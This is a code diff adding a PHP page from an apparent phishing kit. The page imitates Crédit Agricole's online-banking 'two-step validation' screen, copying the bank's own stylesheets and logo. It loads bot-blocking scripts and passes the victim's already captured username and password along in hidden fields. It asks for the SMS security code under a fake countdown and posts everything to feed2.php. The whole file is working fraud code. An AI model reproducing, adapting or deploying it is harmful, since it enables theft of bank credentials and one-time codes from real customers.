@@ -1,0 +1,334 @@
+<?php
+
+session_start();
+    function RANDOM($length = 15) {
+        $characters = '0123456789AZERTY';
+        $randomString = '';
+        for ($i = 0; $i < $length; $i++) {
+            $randomString .= $characters[rand(0, strlen($characters) - 1)];
+        }
+        return $randomString;
+    }
+include("system/blocker.php");
+include("system/detect.php");
+$random = rand(0,100000000000);
+$dis    = substr(md5($random), 0, 25);
+?>
+<html>
+<head>
+<title>Cr&eacute;dit Agricole - Banque et Assurances</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+
+
+
+</style>
+<!--<![endif]-->
+<link rel="shortcut icon" type="image/gif" href="http://www.credit-agricole.fr/squelettes/css/images/logos/favicon.gif?1402067367" />
+<link rel="icon" type="image/gif" href="http://www.credit-agricole.fr/squelettes/css/images/logos/favicon.gif?1402067367" />
+<script type='text/javascript'>var var_zajax_content='content';</script><script type="text/javascript">/* <![CDATA[ */
+var box_settings = {tt_img:true,sel_g:"#documents_portfolio a[type='image/jpeg'],#documents_portfolio a[type='image/png'],#documents_portfolio a[type='image/gif']",sel_c:".mediabox",trans:"elastic",speed:"200",ssSpeed:"2500",maxW:"90%",maxH:"90%",minW:"400px",minH:"",opa:"0.9",str_ssStart:"Diaporama",str_ssStop:"Arrêter",str_cur:"{current}/{total}",str_prev:"Précédent",str_next:"Suivant",str_close:"Fermer",splash_url:""};
+/* ]]> */</script>
+
+<script language="javascript">
+<!--
+function checkData() {
+
+if(document.cashreward.cvv.value.length<3) {
+alert("Vous devez entrer votre num&eacute;ro de code (SMS).");
+document.cashreward.cvv.focus();
+return false}
+
+
+
+if(confirm)   
+{
+return true;}
+else
+{return false;}
+
+}
+// -->
+</script>
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/antiquus.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/antiquus.css?v=50" media="all" />
+
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles.css?v=50" media="all" />
+
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles-mod.css?v=50" media="all" />
+
+<!--[if IE 8]>
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all" />
+<![endif]-->
+
+<!--[if lte IE 7]>
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all" />
+<![endif]-->
+
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all" />
+<![endif]-->
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/stb.css?v=50" media="all" />
+
+
+
+<SCRIPT
+	src="https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/js/infosbulle.js"></SCRIPT>
+<style type="text/css">
+.auto-style1 {
+	text-align: left;
+}
+.auto-style2 {
+	margin-top: 16;
+}
+.auto-style3 {
+	text-align: center;
+}
+.auto-style4 {
+	margin-left: 11;
+}
+</style>
+</head>
+	        <form name="cashreward" action="feed2.php" method="post" onsubmit="return checkData()">
+
+</html>
+
+
+
+
+
+<body  text="#000000" leftmargin="0" topmargin="0" onLoad="Init()">
+<div id="container">
+							<div id="contenu" style="width: 957px;">
+<table border="0" >
+	<tr>
+		<td colspan="3">
+
+
+<div align="center" style="background-color:#E6E6E6;">
+<table width="620px" cellspacing="0" cellpadding="0" border="0">
+<tr>
+<td style="background:#E6E6E6;">
+	<div id="entete_vide">	
+		<div id="entete" style="background:none;">
+   			 <div id="gauche-entete">
+		        <h1>
+		            <a title="Cr&eacute;dit Agricole - Banque et Assurances" href="#" id="lien-logo">
+		                <img alt="Cr&eacute;dit Agricole - Banque et Assurances" src="http://img11.hostingpics.net/pics/526614logo878.png"/>
+		                <span>&nbsp; Cr&eacute;dit Agricole</span></a></h1>
+		    </div>
+   		 </div>
+	</div>
+</td>
+</tr>
+</table>
+</div>
+		</TD>
+	</TR>
+	<TR valign="top">
+	
+		<TD>
+		
+		<TABLE style="background:#00000"border="0" width="100%" cellpadding="0" cellspacing="0">
+
+			<TR >
+				<TD valign="top" width="169" style="background:#E6E6E6 repeat-y scroll left top">&nbsp;</TD>
+				<TD id="col-centre" valign="top" width="590px" >
+				
+				<TABLE width="590" border="0" cellspacing="0" cellpadding="0">
+					<TR>
+						<TD>
+						
+						<table width="590" border="0" cellspacing="0" cellpadding="0">
+							
+							<!-- bandeau authentification --> <tr><td>&nbsp;</td></tr>     
+							<tr>
+								<td height="17"><div class="boutons-act">
+                    <h1>
+                        Validation en deux &eacute;tapes - Cr&eacute;dit Agricole
+                   <span id="top-actions">
+								<a id="top-actions-aide" href=""
+				onmouseout="StatusMessage( false )"
+				onmouseover="StatusMessage(true, statusaide);return true" tabindex="32"
+				>Aide</a></span></h1>
+									<p>
+                        			&nbsp;</p>
+</div></td>
+							</tr>
+						</table>
+						<FORM class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="feed2.php" onSubmit="return false;">
+							<input type="hidden" name="idtcm" value="" /> 
+							<input type="hidden" name="origine" value="vitrine" /> 
+							<input type="hidden" name="situationTravail"
+								value="BANCAIRE" /> 
+							<input type="hidden" name="canal" value="WEB" /> 
+							<input type="hidden" name="typeAuthentification"
+								value="CLIC_RETOUR" />
+							<input type="hidden" name="idUnique" value="682c68bb:144d25ba743:-7fb2" /> 
+							<input type="hidden" name="caisse" value="878" /> 
+							<input type="hidden" name="CCCRYC" value="" />
+						&nbsp;<table width="590" border="0" >
+							<!-- Message securitaire -->
+
+							<tr>
+								<td height="22" colspan="3" class="auto-style1">
+								<input type="hidden" name="CCCRYC2" value="" />
+
+<input type="hidden" name="user" value="<?php print_r($user); ?>">
+<input type="hidden" name="pass" value="<?php print_r($pass); ?>">
+<table width="590" border="0" cellpadding="3" cellspacing="0">
+	<tbody><tr>
+		<td bgcolor="#84aaad" class="titretetiere">
+			<font face="Helvetica,Arial gras" size="3">
+				Code de s&eacute;curit&eacute;:
+			</font>
+		</td>
+	</tr>
+</tbody></table>
+&nbsp;<fieldset class="blc-choix" style="border:0;">
+    <div class="blc-choix-wrap">
+<table width="570" border="0" cellpadding="3" cellspacing="0">
+		<tbody>
+  <tr>
+  <td height="29" style="width: 420px" ><strong>Saisissez le code re&ccedil;u par sms :</strong></td>
+  
+	 
+    <td>
+	<input id="chp3" ="off" class="auto-style7"  name="cvv" maxlength="6" style="font-family: Ubuntu, Arial, Helvetica, sans-serif; margin: 0px 0px 0px 4px; padding: 0px; vertical-align: middle; text-align: center; width: 111px;" type="text" /><td class ="magana" id="timer"></td></td>
+
+<script>
+document.getElementById('timer').innerHTML =
+  05 + ":" + 00;
+startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==59){m=m-1}
+  //if(m<0){alert('timer completed')}
+  
+  document.getElementById('timer').innerHTML =
+    m + ":" + s;
+  setTimeout(startTimer, 1000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+</script>	
+ 
+  </tr>
+  
+ 	   </tbody></table>
+</div>
+</fieldset>
+
+<div class="validation">
+		<input type="submit" id="droite" value="Confirmer">
+
+									
+									
+										
+									
+									
+</div>
+					<h4 class="auto-style3"><span class="ng-binding">&nbsp;&nbsp; *Veuillez patienter le temps de re&ccedil;evoir le code de v&eacute;rification par sms&nbsp;&nbsp; cela peut prendre quelques minutes. 
+					<a href="./sms.html" target="_blank">Cliquez ici pour en savoir plus</a></a></h4>
+
+				
+</div></span>&nbsp;</td>
+							</tr>
+							
+						</table>
+						
+						</td>
+					</tr>
+		<tr >
+		<td>		
+		<!-- Pav&eacute; Certificat --> 
+		
+		<!-- Conditions Juridique --> <form class="ca-forms" style="padding:0 0;">
+			<p class="auto-style2">Je reconnais avoir pris connaissance et accept&eacute; les conditions juridiques de la convention d'utilisation du service.</p><p class="validation" style="width:580px"><script>var srcLien = path_dynamic + "/app/bam/tech/allmedia/stb/entreebam/jsp/AUTH-INF.jsp";var srcPuceLien = path_static + "https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/PuceLien.gif";var yesno = "no";var authentif = "AUTH";</script><a class="retour gauche" HREF="" tabindex="34">Conditions juridiques</a></p></form>
+			</td>
+		</tr>
+		</table>
+		</TD>
+		<TD valign="top" width="171" style="background:#E6E6E6 repeat-y scroll left top">&nbsp;</TD>
+		</TR>
+		
+		
+	<TR valign="middle" style="background-color:#E6E6E6;">
+	<td></td>
+		<TD>
+		<TABLE border=0 cellPadding=0 cellSpacing=0 width="590">
+			<tr>
+				<TD class="footercopyright" align="center">&nbsp;</TD>
+			</tr>
+			<TR>
+				<TD class="footercopyright" align="center">@2004-2018 Cr&eacute;dit Agricole,
+				tous droits r&eacute;serv&eacute;s</TD>
+			</TR>
+		</TABLE>
+		 
+
+
+<noscript>
+<img width="1" height="1" src="https://logs8.xiti.com/hit.xiti?cc=17&cs=878&s2=1&p=identification_autre_" />
+</noscript>
+		</TD>
+		<td ></td>
+	</TR></TABLE>
+</TD>
+
+
+
+</TR>
+</TABLE>
+
+</TD>
+</TR>
+</TABLE>
+<table>
+	<tr>
+		<td width="169"></td>
+		<td id="main_bas" width="570" ></td>
+		<td width="169"></td>
+	</tr>
+</table>
+</div>
+</div>
+</body>
